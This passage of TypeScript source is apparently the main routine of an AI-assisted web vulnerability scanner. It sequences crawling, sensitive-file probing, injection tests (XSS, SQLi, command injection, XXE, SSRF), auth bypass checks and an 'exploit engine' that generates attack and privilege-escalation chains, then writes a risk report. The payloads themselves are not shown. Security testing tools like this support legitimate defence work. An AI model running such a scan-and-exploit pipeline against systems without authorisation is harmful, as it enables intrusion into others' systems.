        await addEvent(scanId, "recon", `[AI] Strategy: ${aiDecision.decision}`, "success");
        if (aiDecision.actions.length > 0) {
          await addEvent(scanId, "recon", `[AI] Priority actions: ${aiDecision.actions.slice(0, 3).map(a => a.action).join(" → ")}`, "info");
        }
      } catch (err) {
        logger.warn({ err }, "AI orchestration failed, continuing");
      }
    }

    await updatePhase(scanId, "recon", 5);
    if (enabled.includes("ssl") || enabled.includes("recon")) {
      await addEvent(scanId, "recon", "[RECON] Checking SSL/TLS configuration...", "info");
      await checkSSL(targetUrl, scanId);
    }

    await updatePhase(scanId, "recon", 8);
    await addEvent(scanId, "recon", "[RECON] Crawling target — discovering pages, forms, and parameters...", "info");
    const maxDepth = scanType === "quick" ? 1 : scanType === "deep" ? 3 : 2;
    const maxPages = scanType === "quick" ? 10 : scanType === "deep" ? 50 : 25;
    const crawlResult = await crawlTarget(targetUrl, maxDepth, maxPages);
    await db.update(scansTable).set({ endpoints: crawlResult.urls }).where(eq(scansTable.id, scanId));
    await addEvent(scanId, "recon", `[RECON] Crawl complete — ${crawlResult.urls.length} pages, ${crawlResult.forms.length} forms, ${crawlResult.allParams.length} parameters discovered`, "success");

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "recon", 12);

    if (enabled.includes("recon")) {
      await addEvent(scanId, "recon", "[RECON] Probing for sensitive file exposure (.env, .git, configs, admin panels)...", "info");
      await discoverSensitiveFiles(targetUrl, scanId);
      await addEvent(scanId, "recon", "[RECON] Sensitive file scan complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "recon", 18);
    if (enabled.includes("recon")) {
      await addEvent(scanId, "recon", "[RECON] Checking for dangerous HTTP methods (TRACE, PUT, DELETE)...", "info");
      await checkDangerousHTTPMethods(targetUrl, scanId);
    }

    // ── Phase 2: Security Headers & Config ──────────────────────────────────
    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 22);
    await addEvent(scanId, "scanning", "[HEADERS] Analyzing all HTTP response headers and cookie security flags...", "info");
    if (enabled.includes("headers")) {
      await checkSecurityHeaders(targetUrl, scanId);
      await addEvent(scanId, "scanning", "[HEADERS] Header & cookie analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 27);
    if (enabled.includes("cors")) {
      await addEvent(scanId, "scanning", "[CORS] Testing Cross-Origin Resource Sharing misconfigurations...", "info");
      await checkCORS(targetUrl, scanId);
      await addEvent(scanId, "scanning", "[CORS] CORS analysis complete", "success");
    }

    // ── Phase 3: Injection Attacks ───────────────────────────────────────────
    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 33);
    await addEvent(scanId, "scanning", `[XSS] Testing ${crawlResult.allParams.length} parameters and ${crawlResult.forms.length} forms with ${XSS_PAYLOADS.length} XSS payloads...`, "info");
    if (enabled.includes("xss")) {
      await checkXSS(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[XSS] Cross-site scripting analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 43);
    await addEvent(scanId, "scanning", "[SQLi] Running SQL injection tests — error-based, boolean-blind, and time-based...", "info");
    if (enabled.includes("sqli")) {
      await checkSQLi(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[SQLi] SQL injection analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 52);
    if (enabled.includes("cmdi")) {
      await addEvent(scanId, "scanning", "[CMDi] Testing for OS command injection vulnerabilities...", "info");
      await checkCommandInjection(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[CMDi] Command injection analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 59);
    if (enabled.includes("lfi")) {
      await addEvent(scanId, "scanning", "[LFI] Testing path traversal and local file inclusion...", "info");
      await checkPathTraversal(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[LFI] Path traversal analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 65);
    if (enabled.includes("xxe")) {
      await addEvent(scanId, "scanning", "[XXE] Testing XML external entity injection...", "info");
      await checkXXE(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[XXE] XXE analysis complete", "success");
    }

    // ── Phase 4: Auth & Business Logic ───────────────────────────────────────
    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 71);
    await addEvent(scanId, "scanning", "[SSRF] Probing server-side request forgery with cloud metadata payloads...", "info");
    if (enabled.includes("ssrf")) {
      await checkSSRF(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[SSRF] SSRF analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 77);
    if (enabled.includes("redirect")) {
      await addEvent(scanId, "scanning", "[REDIRECT] Testing for open redirect vulnerabilities...", "info");
      await checkOpenRedirect(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[REDIRECT] Open redirect analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 82);
    await addEvent(scanId, "scanning", "[CSRF] Analyzing forms and API endpoints for CSRF token enforcement...", "info");
    if (enabled.includes("csrf")) {
      await checkCSRF(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[CSRF] CSRF analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 86);
    await addEvent(scanId, "scanning", "[IDOR] Checking insecure direct object references on resource endpoints...", "info");
    if (enabled.includes("idor")) {
      await checkIDOR(targetUrl, crawlResult, scanId);
      await checkIDORAdvanced(targetUrl, crawlResult.urls, addFinding, scanId);
      await addEvent(scanId, "scanning", "[IDOR] IDOR analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 88);
    await addEvent(scanId, "scanning", "[AUTH] Testing auth bypass — default creds, JWT none algorithm, SQL injection...", "info");
    if (enabled.includes("auth")) {
      await checkRateLimiting(targetUrl, scanId);
      await checkAuthBypass(targetUrl, addFinding, scanId);
      await addEvent(scanId, "scanning", "[AUTH] Authentication analysis complete", "success");
    }

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 90);
    await addEvent(scanId, "scanning", "[GRAPHQL] Testing GraphQL endpoint security...", "info");
    await checkGraphQL(targetUrl, addFinding, scanId);
    await addEvent(scanId, "scanning", "[GRAPHQL] GraphQL analysis complete", "success");

    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 91);
    if (process.env.SHODAN_API_KEY) {
      await addEvent(scanId, "scanning", "[SHODAN] Querying Shodan for open ports, services, and known CVEs...", "info");
      await checkOpenPorts(targetUrl, addFinding, scanId);
      await addEvent(scanId, "scanning", "[SHODAN] Shodan intelligence complete", "success");
    }
    // ── Phase 5: Information Disclosure ──────────────────────────────────────
    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "scanning", 93);
    if (enabled.includes("info")) {
      await addEvent(scanId, "scanning", "[INFO] Scanning for information disclosure — comments, stack traces, email addresses...", "info");
      await checkInfoDisclosure(targetUrl, crawlResult, scanId);
      await addEvent(scanId, "scanning", "[INFO] Information disclosure analysis complete", "success");
    }

    // ── Phase 6: Exploit Engine ────────────────────────────────────────────────
    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "exploitation", 90);
    await addEvent(scanId, "exploitation", "[EXPLOIT] Launching exploit engine — generating attack payloads and exploitation chains...", "info");

    let exploitReport;
    try {
      const vulnFindings = await db.select().from(findingsTable)
        .where(eq(findingsTable.scanId, scanId));
      const exploitTargets = vulnFindings.filter(f => f.severity === "critical" || f.severity === "high").slice(0, 8);

      if (exploitTargets.length > 0) {
        // Get tech stack from scan record
        const [scanRecord] = await db.select({ techStack: scansTable.techStack }).from(scansTable).where(eq(scansTable.id, scanId)).limit(1);
        const techStackArr = (scanRecord?.techStack as string[]) || [];

        exploitReport = await runExploitEngine(scanId, exploitTargets.map(f => ({
          id: f.id,
          type: f.type,
          title: f.title,
          severity: f.severity,
          endpoint: f.endpoint || "",
          parameter: f.parameter || undefined,
          evidence: f.evidence || undefined,
        })), techStackArr);

        await addEvent(scanId, "exploitation", `[EXPLOIT] Exploit engine complete — ${exploitReport.totalExploitsAttempted} attack vectors analyzed`, "warning");
        // Count real Exploit-DB results
        const allExploits = [...exploitReport.criticalExploits, ...exploitReport.highExploits];
        const totalEdbResults = allExploits.reduce((sum, e) => sum + (e.exploitDbResults?.length || 0), 0);
        if (totalEdbResults > 0) {
          await addEvent(scanId, "exploitation", `[EXPLOIT-DB] Found ${totalEdbResults} public exploits from Exploit-DB/NVD database`, "warning");
        }
        if (exploitReport.criticalExploits.length > 0) {
          await addEvent(scanId, "exploitation", `[EXPLOIT] CRITICAL: ${exploitReport.criticalExploits[0].findingType} exploit chain: ${exploitReport.criticalExploits[0].exploitChain.slice(0, 2).join(" → ")}`, "critical");
        }
        for (const chain of exploitReport.exploitChains.slice(0, 3)) {
          await addEvent(scanId, "exploitation", `[EXPLOIT] Attack chain: ${chain.substring(0, 120)}`, "warning");
        }
        for (const path of exploitReport.privilegeEscalationPaths.slice(0, 2)) {
          await addEvent(scanId, "exploitation", `[EXPLOIT] Privilege escalation: ${path.substring(0, 120)}`, "critical");
        }
        await addEvent(scanId, "exploitation", `[EXPLOIT] Risk amplification: ${exploitReport.riskAmplification}/100`, "warning");
      } else {
        await addEvent(scanId, "exploitation", "[EXPLOIT] No critical/high findings to exploit — skipping exploitation phase", "info");
      }
    } catch (err) {
      logger.warn({ err }, "Exploit engine failed, continuing");
      await addEvent(scanId, "exploitation", "[EXPLOIT] Exploit engine failed, continuing with analysis...", "warning");
    }

    // ── Phase 7: AI Analysis & Graph Intelligence ─────────────────────────────
    if (await isCancelled(scanId)) return;
    await updatePhase(scanId, "ai_analysis", 94);
    await addEvent(scanId, "ai_analysis", "[AI] Running AI-powered vulnerability correlation and risk scoring...", "info");

    const allFindings = await db.select().from(findingsTable).where(eq(findingsTable.scanId, scanId));
    const critical = allFindings.filter(f => f.severity === "critical").length;
    const high = allFindings.filter(f => f.severity === "high").length;
    const medium = allFindings.filter(f => f.severity === "medium").length;
    const low = allFindings.filter(f => f.severity === "low").length;
    const info = allFindings.filter(f => f.severity === "info").length;
    const types = [...new Set(allFindings.map(f => f.type))];

    let aiAnalysisResult;
    try {
      aiAnalysisResult = await analyzeVulnerabilitiesWithAI(scanId, allFindings.map(f => ({
        type: f.type,
        title: f.title,
        severity: f.severity,
        endpoint: f.endpoint,
        description: f.description,
      })));
      await addEvent(scanId, "ai_analysis", `[AI] Risk Score: ${aiAnalysisResult.riskScore}/100 — ${aiAnalysisResult.executiveSummary.substring(0, 120)}...`, "success");
      if (aiAnalysisResult.attackChains.length > 0) {
        await addEvent(scanId, "ai_analysis", `[AI] Attack chains identified: ${aiAnalysisResult.attackChains[0]}`, "warning");
      }
    } catch (err) {
      logger.warn({ err }, "AI vulnerability analysis failed");
    }

    // Build Maltego-style attack graph
    await addEvent(scanId, "ai_analysis", "[AI] Building Maltego-style attack graph — mapping domain → IP → server → vulnerabilities...", "info");
    try {
      if (reconResult) {
        await buildAttackGraph(scanId, reconResult, allFindings.map(f => ({
          id: f.id, type: f.type, title: f.title, severity: f.severity, endpoint: f.endpoint,
        })));
        await addEvent(scanId, "ai_analysis", "[AI] Attack graph constructed successfully", "success");
      }
    } catch (err) {
      logger.warn({ err }, "Attack graph build failed");
    }

    let riskLevel = "Low";
    if (critical > 0) riskLevel = "CRITICAL";
    else if (high > 0) riskLevel = "HIGH";
    else if (medium > 2) riskLevel = "MEDIUM";

    const riskScore = aiAnalysisResult?.riskScore ?? Math.min(100, critical * 15 + high * 8 + medium * 3 + low);

    const aiAnalysis = `## AI-Powered Security Assessment Complete

**Target:** ${targetUrl}
**Risk Level: ${riskLevel}** | **Risk Score: ${riskScore}/100**
**Total Findings: ${allFindings.length}**

### Severity Breakdown
- 🔴 Critical: ${critical}
- 🟠 High: ${high}
- 🟡 Medium: ${medium}
- 🔵 Low: ${low}
- ⚪ Info: ${info}

### Vulnerability Categories Detected
${types.length > 0 ? types.map(t => `- ${t}`).join("\n") : "- None detected"}

### Attack Surface Summary
- Pages Crawled: ${crawlResult.urls.length}
- Forms Discovered: ${crawlResult.forms.length}
- Parameters Tested: ${crawlResult.allParams.length}
- Tech Stack: ${techStack.join(", ") || "Not disclosed"}

${aiAnalysisResult ? `### AI Executive Summary
${aiAnalysisResult.executiveSummary}

### Identified Attack Chains
${aiAnalysisResult.attackChains.map(c => `- ${c}`).join("\n") || "- No chained attacks identified"}

### AI-Prioritized Remediation
${aiAnalysisResult.prioritizedActions.map((a, i) => `${i + 1}. ${a}`).join("\n")}` : `### Risk Assessment
${critical > 0 ? `⚠️ CRITICAL RISK: ${critical} critical vulnerabilities require immediate remediation.` : ""}
${high > 0 ? `🔴 HIGH RISK: ${high} high severity findings should be remediated before production deployment.` : ""}
${allFindings.length === 0 ? "✅ No significant vulnerabilities detected in this automated scan." : ""}

### Recommended Remediation Priority
1. Immediately fix all Critical vulnerabilities
2. Address High severity issues within 24-48 hours
3. Schedule Medium severity fixes within 1-2 weeks
4. Track Low/Info items in security backlog
5. Re-scan after fixes to verify remediation`}`;

    await db.update(scansTable).set({
      status: "completed",
      completedAt: new Date(),
      progress: 100,
      currentPhase: "done",
      aiAnalysis,
      riskScore,
    }).where(eq(scansTable.id, scanId));

    scanEmitter.emit(`scan:${scanId}`, { type: "status", data: { status: "completed" } });
    await addEvent(scanId, "ai_analysis", `[COMPLETE] Scan finished — ${allFindings.length} findings: ${critical} critical, ${high} high, ${medium} medium, ${low} low, ${info} info | Risk Score: ${riskScore}/100`, "success");

  } catch (err) {
    logger.error({ err, scanId }, "Scan failed");
    try {
      await db.update(scansTable).set({ status: "failed", completedAt: new Date() }).where(eq(scansTable.id, scanId));
      scanEmitter.emit(`scan:${scanId}`, { type: "status", data: { status: "failed" } });
      await addEvent(scanId, "error", `[ERROR] Scan failed: ${err instanceof Error ? err.message : String(err)}`, "error");
    } catch { }
  }
}
